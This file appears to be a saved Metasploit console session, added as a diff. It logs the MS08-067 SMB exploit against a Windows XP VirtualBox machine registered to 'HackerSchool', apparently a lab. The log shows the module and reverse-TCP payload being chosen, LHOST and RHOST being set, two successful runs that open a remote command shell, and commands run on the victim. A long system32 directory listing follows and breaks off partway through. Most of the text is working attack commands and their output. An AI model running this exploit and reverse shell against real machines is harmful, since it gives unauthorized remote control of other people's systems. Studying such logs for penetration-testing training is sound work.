@@ -1,0 +1,2818 @@
+] Database already started
+[i] The database appears to be already configured, skipping initialization
+                                                  
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
+
+
+       =[ metasploit v4.17.3-dev                          ]
++ -- --=[ 1797 exploits - 1019 auxiliary - 310 post       ]
++ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > search ms08-067
+
+Matching Modules
+================
+
+   Name                                 Disclosure Date  Rank   Description
+   ----                                 ---------------  ----   -----------
+   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
+
+
+msf > exploit exploit/windows/smb/ms08_067_netapi
+[-] Unknown command: exploit.
+msf > exploit exploit/windows/smb/ms08_067_netapi
+[-] Unknown command: exploit.
+msf > exploit exploit/windows/smb/ms08_067_netapi
+[-] Unknown command: exploit.
+msf > use exploit/windows/smb/ms08_067_netapi
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > set payload windows/shell/reverse_tcp
+payload => windows/shell/reverse_tcp
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.0.155
+LHOST => 192.168.0.155
+msf exploit(windows/smb/ms08_067_netapi) > ifconfig
+[*] exec: ifconfig
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.0.132  netmask 255.255.255.0  broadcast 192.168.0.255
+        inet6 2406:7400:73:8865:e2d5:5eff:fe78:54d1  prefixlen 64  scopeid 0x0<global>
+        inet6 2406:7400:73:8865:f005:991:9ce4:1a27  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::e2d5:5eff:fe78:54d1  prefixlen 64  scopeid 0x20<link>
+        ether e0:d5:5e:78:54:d1  txqueuelen 1000  (Ethernet)
+        RX packets 86514  bytes 68563981 (65.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 53320  bytes 9232164 (8.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 113666  bytes 49418284 (47.1 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 113666  bytes 49418284 (47.1 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.0.132
+LHOST => 192.168.0.132
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > Set RHOST 192.168.0.116
+[-] Unknown command: Set.
+msf exploit(windows/smb/ms08_067_netapi) > set  RHOST 192.168.0.116
+RHOST => 192.168.0.116
+msf exploit(windows/smb/ms08_067_netapi) > show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    192.168.0.116    yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.132    yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
+[*] 192.168.0.116:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] 192.168.0.116:445 - Attempting to trigger the vulnerability...
+[*] Encoded stage with x86/shikata_ga_nai
+[*] Sending encoded stage (267 bytes) to 192.168.0.116
+[*] Command shell session 1 opened (192.168.0.132:4444 -> 192.168.0.116:1076) at 2019-07-13 17:27:23 +0530
+
+
+
+C:\WINDOWS\system32>cd user
+cd user
+The system cannot find the path specified.
+
+C:\WINDOWS\system32>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\WINDOWS\system32>ipconfig
+ipconfig
+
+C:\WINDOWS\system32>systeminfo
+systeminfo
+
+C:\WINDOWS\system32>shutdown -r -t 0 
+
+
+[*] 192.168.0.116 - Command shell session 1 closed.  Reason: User exit
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 192.168.0.132:4444 
+[*] 192.168.0.116:445 - Automatically detecting the target...
+[*] 192.168.0.116:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
+[*] 192.168.0.116:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
+[*] 192.168.0.116:445 - Attempting to trigger the vulnerability...
+[*] Encoded stage with x86/shikata_ga_nai
+[*] Sending encoded stage (267 bytes) to 192.168.0.116
+[*] Command shell session 2 opened (192.168.0.132:4444 -> 192.168.0.116:1045) at 2019-07-13 17:29:34 +0530
+
+
+
+C:\WINDOWS\system32>ipconfig        
+ipconfig
+
+C:\WINDOWS\system32>systeminfo
+systeminfo
+
+Host Name:                 HACKERSC-C6E8B1
+OS Name:                   Microsoft Windows XP Professional
+OS Version:                5.1.2600 Service Pack 2 Build 2600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Uniprocessor Free
+Registered Owner:          Vic
+Registered Organization:   HackerSchool
+Product ID:                55274-643-7213323-23453
+Original Install Date:     9/23/2018, 12:15:36 AM
+System Up Time:            0 Days, 0 Hours, 1 Minutes, 24 Seconds
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x86 Family 6 Model 61 Stepping 4 GenuineIntel ~1805 Mhz
+BIOS Version:              VBOX   - 1
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT+05:30) Chennai, Kolkata, Mumbai, New Delhi
+Total Physical Memory:     511 MB
+Available Physical Memory: 357 MB
+Virtual Memory: Max Size:  2,048 MB
+Virtual Memory: Available: 2,002 MB
+Virtual Memory: In Use:    46 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: Q147222
+NetWork Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 T Server Adapter
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.0.1
+                                 IP address(es)
+                                 [01]: 192.168.0.116
+
+C:\WINDOWS\system32>dir             
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 4C90-9010
+
+ Directory of C:\WINDOWS\system32
+
+09/23/2018  12:22 AM    <DIR>          .
+09/23/2018  12:22 AM    <DIR>          ..
+09/23/2018  12:15 AM               261 $winnt$.inf
+09/23/2018  05:38 AM    <DIR>          1025
+09/23/2018  05:38 AM    <DIR>          1028
+09/23/2018  05:38 AM    <DIR>          1031
+09/23/2018  05:38 AM    <DIR>          1033
+09/23/2018  05:38 AM    <DIR>          1037
+09/23/2018  05:38 AM    <DIR>          1041
+09/23/2018  05:38 AM    <DIR>          1042
+09/23/2018  05:38 AM    <DIR>          1054
+08/23/2001  05:30 PM             2,151 12520437.cpx
+08/23/2001  05:30 PM             2,233 12520850.cpx
+09/23/2018  05:38 AM    <DIR>          2052
+09/23/2018  05:38 AM    <DIR>          3076
+09/23/2018  05:38 AM    <DIR>          3com_dmi
+08/04/2004  12:56 AM           100,352 6to4svc.dll
+08/23/2001  05:30 PM            25,600 aaaamon.dll
+08/04/2004  12:56 AM            68,608 access.cpl
+08/23/2001  05:30 PM            64,512 acctres.dll
+08/04/2004  12:56 AM           183,808 accwiz.exe
+08/23/2001  05:30 PM            61,952 acelpdec.ax
+08/23/2001  05:30 PM           129,536 acledit.dll
+08/04/2004  12:56 AM           114,688 aclui.dll
+08/04/2004  12:56 AM           194,048 activeds.dll
+08/23/2001  05:30 PM           111,104 activeds.tlb
+08/04/2004  12:56 AM             4,096 actmovie.exe
+08/04/2004  12:56 AM           101,888 actxprxy.dll
+08/04/2004  12:56 AM            61,440 admparse.dll
+08/23/2001  05:30 PM            26,112 adptif.dll
+08/04/2004  12:56 AM           175,616 adsldp.dll
+08/04/2004  12:56 AM           143,360 adsldpc.dll
+08/04/2004  12:56 AM            68,096 adsmsext.dll
+08/23/2001  05:30 PM           161,792 adsnds.dll
+08/04/2004  12:56 AM           263,680 adsnt.dll
+08/23/2001  05:30 PM           109,568 adsnw.dll
+08/04/2004  12:56 AM           616,960 advapi32.dll
+08/04/2004  12:56 AM            99,840 advpack.dll
+08/04/2004  12:56 AM            98,304 ahui.exe
+08/04/2004  12:56 AM            44,544 alg.exe
+08/04/2004  12:56 AM            17,408 alrsvc.dll
+09/23/2018  12:14 AM            16,832 amcompat.tlb
+08/04/2004  12:56 AM            70,656 amstream.dll
+08/23/2001  05:30 PM             9,029 ansi.sys
+08/23/2001  05:30 PM           102,912 apcups.dll
+08/23/2001  05:30 PM            12,498 append.exe
+08/04/2004  12:56 AM           126,976 apphelp.dll
+08/04/2004  12:56 AM           167,936 appmgmts.dll
+08/04/2004  12:56 AM           295,936 appmgr.dll
+08/04/2004  12:56 AM           549,888 appwiz.cpl
+08/23/2001  05:30 PM            19,456 arp.exe
+08/03/2004  11:01 PM           114,688 asctrls.ocx
+08/04/2004  12:56 AM             8,192 asferror.dll
+08/04/2004  12:56 AM            30,208 asr_fmt.exe
+08/23/2001  05:30 PM            32,256 asr_ldm.exe
+08/04/2004  12:56 AM            32,768 asr_pfu.exe
+08/04/2004  12:56 AM            65,024 asycfilt.dll
+08/04/2004  12:56 AM            25,088 at.exe
+08/23/2001  05:30 PM            13,312 atkctrs.dll
+08/04/2004  12:56 AM            58,880 atl.dll
+08/04/2004  12:56 AM            11,264 atmadm.exe
+08/04/2004  12:56 AM           285,696 atmfd.dll
+08/04/2004  12:56 AM            30,208 atmlib.dll
+08/23/2001  05:30 PM            34,816 atmpvcno.dll
+08/23/2001  05:30 PM            11,264 atrace.dll
+08/23/2001  05:30 PM            11,264 attrib.exe
+08/04/2004  12:56 AM            42,496 audiosrv.dll
+08/04/2004  12:56 AM            14,336 auditusr.exe
+08/04/2004  12:56 AM            56,832 authz.dll
+08/04/2004  12:56 AM           588,800 autochk.exe
+08/04/2004  12:56 AM           602,624 autoconv.exe
+08/23/2001  05:30 PM            80,384 autodisc.dll
+08/23/2001  05:30 PM             1,688 AUTOEXEC.NT
+08/04/2004  12:56 AM           580,608 autofmt.exe
+08/04/2004  12:56 AM            11,264 autolfn.exe
+08/23/2001  05:30 PM            69,584 avicap.dll
+08/23/2001  05:30 PM            64,000 avicap32.dll
+08/04/2004  12:56 AM            84,992 avifil32.dll
+08/23/2001  05:30 PM           109,456 avifile.dll
+08/23/2001  05:30 PM            16,384 avmeter.dll
+08/23/2001  05:30 PM           227,840 avtapi.dll
+08/23/2001  05:30 PM            73,216 avwav.dll
+08/04/2004  12:56 AM            52,736 basesrv.dll
+08/04/2004  12:56 AM            28,672 batmeter.dll
+08/04/2004  12:56 AM             8,704 batt.dll
+08/04/2004  12:56 AM            17,408 bidispl.dll
+08/23/2001  05:30 PM            28,420 bios1.rom
+08/23/2001  05:30 PM             8,191 bios4.rom
+08/04/2004  12:56 AM             8,192 bitsprx2.dll
+08/04/2004  12:56 AM             7,168 bitsprx3.dll
+08/04/2004  12:56 AM           286,208 blackbox.dll
+08/04/2004  12:56 AM            71,680 blastcln.exe
+08/23/2001  05:30 PM           136,704 bootcfg.exe
+08/23/2001  05:30 PM             4,608 bootok.exe
+08/23/2001  05:30 PM            12,288 bootvid.dll
+08/23/2001  05:30 PM             5,120 bootvrfy.exe
+08/23/2001  05:30 PM            22,984 bopomofo.uce
+08/04/2004  12:56 AM            63,488 browselc.dll
+08/04/2004  12:56 AM            77,312 browser.dll
+08/04/2004  12:56 AM         1,016,832 browseui.dll
+08/04/2004  12:56 AM            78,336 browsewm.dll
+08/04/2004  12:56 AM            20,992 bthci.dll
+08/04/2004  12:56 AM           110,592 bthprops.cpl
+08/04/2004  12:56 AM            30,208 bthserv.dll
+08/04/2004  12:56 AM            50,688 btpanui.dll
+08/04/2004  12:56 AM            59,904 cabinet.dll
+08/04/2004  12:56 AM            84,480 cabview.dll
+08/23/2001  05:30 PM            18,432 cacls.exe
+08/23/2001  05:30 PM           114,688 calc.exe
+08/04/2004  12:56 AM            50,688 camocx.dll
+08/23/2001  05:30 PM           142,848 capesnpn.dll
+08/23/2001  05:30 PM           359,936 cards.dll
+09/23/2018  05:39 AM    <DIR>          CatRoot
+09/23/2018  12:17 AM    <DIR>          CatRoot2
+08/04/2004  12:56 AM           229,888 catsrv.dll
+08/04/2004  12:56 AM            85,504 catsrvps.dll
+08/04/2004  12:56 AM           628,224 catsrvut.dll
+08/23/2001  05:30 PM            27,648 ccfgnt.dll
+08/04/2004  12:56 AM           150,528 cdfview.dll
+08/04/2004  12:56 AM            66,560 cdm.dll
+08/23/2001  05:30 PM            15,872 cdmodem.dll
+08/04/2004  12:56 AM         2,067,968 cdosys.dll
+08/04/2004  12:56 AM           194,560 certcli.dll
+08/04/2004  12:56 AM           457,728 certmgr.dll
+08/23/2001  05:30 PM            42,339 certmgr.msc
+08/04/2004  12:56 AM           159,232 cewmdm.dll
+08/04/2004  12:56 AM            38,912 cfgbkend.dll
+08/04/2004  12:56 AM            16,896 cfgmgr32.dll
+08/23/2001  05:30 PM            80,384 charmap.exe
+08/23/2001  05:30 PM             7,680 chcp.com
+08/23/2001  05:30 PM            11,776 chkdsk.exe
+08/23/2001  05:30 PM            11,264 chkntfs.exe
+08/23/2001  05:30 PM           163,328 ciadmin.dll
+08/23/2001  05:30 PM            41,762 ciadv.msc
+08/23/2001  05:30 PM           109,568 cic.dll
+08/23/2001  05:30 PM             8,192 cidaemon.exe
+08/04/2004  12:56 AM            69,120 ciodm.dll
+08/04/2004  12:56 AM            56,320 cipher.exe
+08/04/2004  12:56 AM             5,632 cisvc.exe
+08/23/2001  05:30 PM             7,680 ckcnv.exe
+08/23/2001  05:30 PM            10,752 clb.dll
+08/04/2004  12:56 AM           110,080 clbcatex.dll
+08/04/2004  12:56 AM           501,248 clbcatq.dll
+08/04/2004  12:56 AM            64,000 cleanmgr.exe
+08/23/2001  05:30 PM            71,859 cliconf.chm
+08/04/2004  12:56 AM            77,824 cliconfg.dll
+08/04/2004  12:56 AM            20,480 cliconfg.exe
+08/03/2004  10:21 PM            24,576 cliconfg.rll
+08/04/2004  12:56 AM           102,912 clipbrd.exe
+08/04/2004  12:56 AM            33,280 clipsrv.exe
+08/04/2004  12:56 AM            57,856 clusapi.dll
+08/04/2004  12:56 AM            15,872 cmcfg32.dll
+08/04/2004  12:56 AM           388,608 cmd.exe
+08/04/2004  12:56 AM           343,040 cmdial32.dll
+08/04/2004  12:56 AM            47,104 cmdl32.exe
+08/23/2001  05:30 PM            40,505 cmdlib.wsc
+08/23/2001  05:30 PM            61,172 cmmgr32.hlp
+08/04/2004  12:56 AM            39,936 cmmon32.exe
+08/23/2001  05:30 PM                64 cmos.ram
+08/23/2001  05:30 PM            14,336 cmpbk32.dll
+08/04/2004  12:56 AM           185,344 cmprops.dll
+08/04/2004  12:56 AM            13,824 cmsetACL.dll
+08/04/2004  12:56 AM            63,488 cmstp.exe
+08/04/2004  12:56 AM            39,936 cmutil.dll
+08/04/2004  01:05 AM            47,104 cnbjmon.dll
+08/23/2001  05:30 PM            32,768 cnetcfg.dll
+08/23/2001  05:30 PM            26,624 cnvfat.dll
+08/04/2004  12:56 AM            62,464 colbact.dll
+09/23/2018  12:13 AM    <DIR>          Com
+08/23/2001  05:30 PM            25,600 comaddin.dll
+08/23/2001  05:30 PM             3,584 comcat.dll
+08/04/2004  12:56 AM           611,328 comctl32.dll
+08/04/2004  12:56 AM           276,992 comdlg32.dll
+08/23/2001  05:30 PM            10,544 comm.drv
+08/23/2001  05:30 PM            50,620 command.com
+08/23/2001  05:30 PM            32,816 commdlg.dll
+08/23/2001  05:30 PM            15,872 comp.exe
+08/23/2001  05:30 PM            17,408 compact.exe
+08/04/2004  12:56 AM           252,928 compatUI.dll
+08/23/2001  05:30 PM            38,302 compmgmt.msc
+08/23/2001  05:30 PM            30,160 compobj.dll
+08/04/2004  12:56 AM           229,376 compstui.dll
+08/23/2001  05:30 PM            82,432 comrepl.dll
+08/04/2004  12:56 AM           792,064 comres.dll
+08/23/2001  05:30 PM           147,456 comsnap.dll
+08/04/2004  12:56 AM         1,251,840 comsvcs.dll
+08/04/2004  12:56 AM           540,160 comuid.dll
+09/23/2018  12:15 AM    <DIR>          config
+09/23/2018  12:14 AM             2,577 CONFIG.NT
+08/23/2001  05:30 PM             2,577 CONFIG.TMP
+08/23/2001  05:30 PM           345,600 confmsp.dll
+08/04/2004  12:56 AM            27,648 conime.exe
+08/23/2001  05:30 PM            66,560 console.dll
+08/23/2001  05:30 PM             8,192 control.exe
+08/23/2001  05:30 PM            13,824 convert.exe
+08/04/2004  12:56 AM            35,328 corpol.dll
+08/23/2001  05:30 PM            27,097 country.sys
+08/04/2004  12:56 AM           163,840 credui.dll
+08/23/2001  05:30 PM           149,019 crtdll.dll
+08/04/2004  12:56 AM           597,504 crypt32.dll
+08/04/2004  12:56 AM            74,752 cryptdlg.dll
+08/04/2004  12:56 AM            33,280 cryptdll.dll
+08/04/2004  12:56 AM            53,760 cryptext.dll
+08/04/2004  12:56 AM            63,488 cryptnet.dll
+08/04/2004  12:56 AM            60,416 cryptsvc.dll
+08/04/2004  12:56 AM           512,512 cryptui.dll
+08/04/2004  12:56 AM           101,888 cscdll.dll
+08/04/2004  12:56 AM            98,304 cscript.exe
+08/04/2004  12:56 AM           326,656 cscui.dll
+08/04/2004  12:56 AM            32,768 csrsrv.dll
+08/04/2004  12:56 AM             6,144 csrss.exe
+08/23/2001  05:30 PM            73,728 csseqchk.dll
+08/04/2004  12:56 AM            15,360 ctfmon.exe
+08/23/2001  05:30 PM            27,136 ctl3d32.dll
+08/23/2001  05:30 PM            27,200 ctl3dv2.dll
+08/23/2001  05:30 PM             8,386 ctype.nls
+08/23/2001  05:30 PM            66,082 c_037.nls
+08/23/2001  05:30 PM            66,082 c_10000.nls
+08/23/2001  05:30 PM            66,082 c_10006.nls
+08/23/2001  05:30 PM            66,082 c_10007.nls
+08/23/2001  05:30 PM            66,082 c_10010.nls
+08/23/2001  05:30 PM            66,082 c_10017.nls
+08/23/2001  05:30 PM            66,082 c_10029.nls
+08/23/2001  05:30 PM            66,082 c_10079.nls
+08/23/2001  05:30 PM            66,082 c_10081.nls
+08/23/2001  05:30 PM            66,082 c_10082.nls
+08/23/2001  05:30 PM            66,082 c_1026.nls
+08/23/2001  05:30 PM            66,082 c_1250.nls
+08/23/2001  05:30 PM            66,082 c_1251.nls
+08/23/2001  05:30 PM            66,082 c_1252.nls
+08/23/2001  05:30 PM            66,082 c_1253.nls
+08/23/2001  05:30 PM            66,082 c_1254.nls
+08/23/2001  05:30 PM            66,082 c_1255.nls
+08/23/2001  05:30 PM            66,082 c_1256.nls
+08/23/2001  05:30 PM            66,082 c_1257.nls
+08/23/2001  05:30 PM            66,082 c_1258.nls
+08/23/2001  05:30 PM            66,082 c_20127.nls
+08/23/2001  05:30 PM           139,810 c_20261.nls
+08/23/2001  05:30 PM            66,082 c_20866.nls
+08/23/2001  05:30 PM            66,082 c_20905.nls
+08/23/2001  05:30 PM            66,082 c_21866.nls
+08/23/2001  05:30 PM            66,082 c_28591.nls
+08/23/2001  05:30 PM            66,082 c_28592.nls
+08/23/2001  05:30 PM            66,082 c_28593.nls
+08/23/2001  05:30 PM            66,082 C_28594.NLS
+08/23/2001  05:30 PM            66,082 C_28595.NLS
+08/23/2001  05:30 PM            66,082 C_28597.NLS
+08/23/2001  05:30 PM            66,082 c_28598.nls
+08/23/2001  05:30 PM            66,082 c_28599.nls
+07/17/2004  11:48 AM            66,082 c_28603.nls
+08/23/2001  05:30 PM            66,082 c_28605.nls
+08/23/2001  05:30 PM            66,594 c_437.nls
+08/23/2001  05:30 PM            66,082 c_500.nls
+08/23/2001  05:30 PM            66,594 c_737.nls
+08/23/2001  05:30 PM            66,594 c_775.nls
+08/23/2001  05:30 PM            66,594 c_850.nls
+08/23/2001  05:30 PM            66,594 c_852.nls
+08/23/2001  05:30 PM            66,594 c_855.nls
+08/23/2001  05:30 PM            66,594 c_857.nls
+08/23/2001  05:30 PM            66,594 c_860.nls
+08/23/2001  05:30 PM            66,594 c_861.nls
+08/23/2001  05:30 PM            66,594 c_863.nls
+08/23/2001  05:30 PM            66,594 c_865.nls
+08/23/2001  05:30 PM            66,594 c_866.nls
+08/23/2001  05:30 PM            66,594 c_869.nls
+08/23/2001  05:30 PM            66,594 c_874.nls
+08/23/2001  05:30 PM            66,082 c_875.nls
+08/23/2001  05:30 PM           162,850 c_932.nls
+08/23/2001  05:30 PM           196,642 c_936.nls
+08/23/2001  05:30 PM           196,642 c_949.nls
+08/23/2001  05:30 PM           196,642 c_950.nls
+08/04/2004  12:56 AM         1,179,648 d3d8.dll
+08/04/2004  12:56 AM             8,192 d3d8thk.dll
+08/04/2004  12:56 AM         1,689,088 d3d9.dll
+08/23/2001  05:30 PM           436,224 d3dim.dll
+08/04/2004  12:56 AM           825,344 d3dim700.dll
+08/23/2001  05:30 PM            34,816 d3dpmesh.dll
+08/23/2001  05:30 PM           590,336 d3dramp.dll
+08/23/2001  05:30 PM           350,208 d3drm.dll
+08/23/2001  05:30 PM            47,616 d3dxof.dll
+08/04/2004  12:56 AM         1,053,696 danim.dll
+08/04/2004  12:56 AM            54,272 dataclen.dll
+08/23/2001  05:30 PM           152,064 datime.dll
+08/04/2004  12:56 AM            24,576 davclnt.dll
+08/03/2004  11:01 PM           153,088 daxctle.ocx
+08/23/2001  05:30 PM           847,872 dbgeng.dll
+08/04/2004  12:56 AM           640,000 dbghelp.dll
+08/04/2004  12:56 AM            24,576 dbmsrpcn.dll
+08/04/2004  12:56 AM           110,592 dbnetlib.dll
+08/04/2004  12:56 AM            28,672 dbnmpntw.dll
+08/04/2004  01:07 AM             1,788 Dcache.bin
+08/04/2004  12:56 AM             8,704 dciman32.dll
+08/23/2001  05:30 PM             5,120 dcomcnfg.exe
+08/23/2001  05:30 PM            39,424 ddeml.dll
+08/04/2004  12:56 AM            30,208 ddeshare.exe
+08/04/2004  12:56 AM           266,240 ddraw.dll
+08/04/2004  12:56 AM            27,136 ddrawex.dll
+08/23/2001  05:30 PM            20,634 debug.exe
+08/04/2004  12:56 AM            25,088 defrag.exe
+08/04/2004  12:56 AM           135,168 desk.cpl
+08/23/2001  05:30 PM            16,384 deskadp.dll
+08/23/2001  05:30 PM            16,896 deskmon.dll
+08/23/2001  05:30 PM            18,432 deskperf.dll
+08/23/2001  05:30 PM                 2 desktop.ini
+08/04/2004  12:56 AM            59,904 devenum.dll
+08/23/2001  05:30 PM            33,079 devmgmt.msc
+08/04/2004  12:56 AM           282,624 devmgr.dll
+08/23/2001  05:30 PM            41,397 dfrg.msc
+08/04/2004  12:56 AM            82,432 dfrgfat.exe
+08/04/2004  12:56 AM           104,960 dfrgntfs.exe
+08/23/2001  05:30 PM            51,200 dfrgres.dll
+08/04/2004  12:56 AM            38,912 dfrgsnap.dll
+08/04/2004  12:56 AM           123,904 dfrgui.dll
+08/04/2004  12:56 AM            28,672 dfsshlex.dll
+08/04/2004  12:56 AM           111,104 dgnet.dll
+08/23/2001  05:30 PM           176,157 dgrpsetu.dll
+08/23/2001  05:30 PM            85,020 dgsetup.dll
+09/23/2018  05:38 AM    <DIR>          dhcp
+08/04/2004  12:56 AM           111,104 dhcpcsvc.dll
+08/23/2001  05:30 PM           370,176 dhcpmon.dll
+08/23/2001  05:30 PM            74,240 dhcpsapi.dll
+08/23/2001  05:30 PM           394,240 diactfrm.dll
+08/04/2004  12:56 AM            85,504 diantz.exe
+08/04/2004  12:56 AM            68,608 digest.dll
+08/23/2001  05:30 PM            44,032 dimap.dll
+08/04/2004  12:56 AM           159,232 dinput.dll
+08/04/2004  12:56 AM           181,760 dinput8.dll
+09/23/2018  12:14 AM    <DIR>          DirectX
+08/23/2001  05:30 PM             9,216 diskcomp.com
+08/23/2001  05:30 PM             7,168 diskcopy.com
+08/23/2001  05:30 PM         1,501,696 diskcopy.dll
+08/23/2001  05:30 PM            33,673 diskmgmt.msc
+08/04/2004  12:56 AM           163,840 diskpart.exe
+08/23/2001  05:30 PM            17,920 diskperf.exe
+08/23/2001  05:30 PM            45,083 dispex.dll
+08/04/2004  12:56 AM             5,120 dllhost.exe
+08/23/2001  05:30 PM             4,608 dllhst3g.exe
+08/04/2004  12:56 AM           224,768 dmadmin.exe
+08/04/2004  12:56 AM            28,672 dmband.dll
+08/04/2004  12:56 AM            61,440 dmcompos.dll
+08/23/2001  05:30 PM           330,752 dmconfig.dll
+08/23/2001  05:30 PM           273,920 dmdlgs.dll
+08/04/2004  12:56 AM           200,704 dmdskmgr.dll
+08/23/2001  05:30 PM           118,784 dmdskres.dll
+08/04/2004  12:56 AM           181,248 dmime.dll
+08/23/2001  05:30 PM            18,432 dmintf.dll
+08/04/2004  12:56 AM            35,840 dmloader.dll
+08/23/2001  05:30 PM            19,456 dmocx.dll
+08/04/2004  12:56 AM            15,872 dmremote.exe
+08/04/2004  12:56 AM            82,432 dmscript.dll
+08/04/2004  12:56 AM            23,552 dmserver.dll
+08/04/2004  12:56 AM           105,984 dmstyle.dll
+08/04/2004  12:56 AM           103,424 dmsynth.dll
+08/04/2004  12:56 AM           104,448 dmusic.dll
+08/04/2004  01:05 AM            52,224 dmutil.dll
+08/23/2001  05:30 PM            61,440 dmview.ocx
+08/04/2004  12:56 AM           148,480 dnsapi.dll
+08/04/2004  12:56 AM            45,568 dnsrslvr.dll
+08/23/2001  05:30 PM            46,080 docprop.dll
+08/04/2004  12:56 AM            48,128 docprop2.dll
+08/23/2001  05:30 PM            10,752 doskey.exe
+08/03/2004  10:51 PM            53,840 dosx.exe
+08/04/2004  12:56 AM            96,768 dpcdll.dll
+08/23/2001  05:30 PM            33,040 dplay.dll
+08/04/2004  12:56 AM            30,208 dplaysvr.exe
+08/04/2004  12:56 AM           229,888 dplayx.dll
+08/04/2004  12:56 AM            23,552 dpmodemx.dll
+08/04/2004  12:56 AM             3,584 dpnaddr.dll
+08/04/2004  12:56 AM           375,296 dpnet.dll
+08/04/2004  12:56 AM            35,328 dpnhpast.dll
+08/04/2004  12:56 AM            60,928 dpnhupnp.dll
+08/04/2004  12:56 AM             3,584 dpnlobby.dll
+08/23/2001  05:30 PM            62,464 dpnmodem.dll
+08/04/2004  12:56 AM            18,432 dpnsvr.exe
+08/23/2001  05:30 PM            61,952 dpnwsock.dll
+08/23/2001  05:30 PM            53,520 dpserial.dll
+08/04/2004  12:56 AM            21,504 dpvacm.dll
+08/04/2004  12:56 AM           212,480 dpvoice.dll
+08/04/2004  12:56 AM            83,456 dpvsetup.exe
+08/04/2004  12:56 AM           116,736 dpvvox.dll
+08/23/2001  05:30 PM            42,768 dpwsock.dll
+08/04/2004  12:56 AM            57,344 dpwsockx.dll
+08/23/2001  05:30 PM            58,368 driverquery.exe
+09/23/2018  12:24 AM    <DIR>          drivers
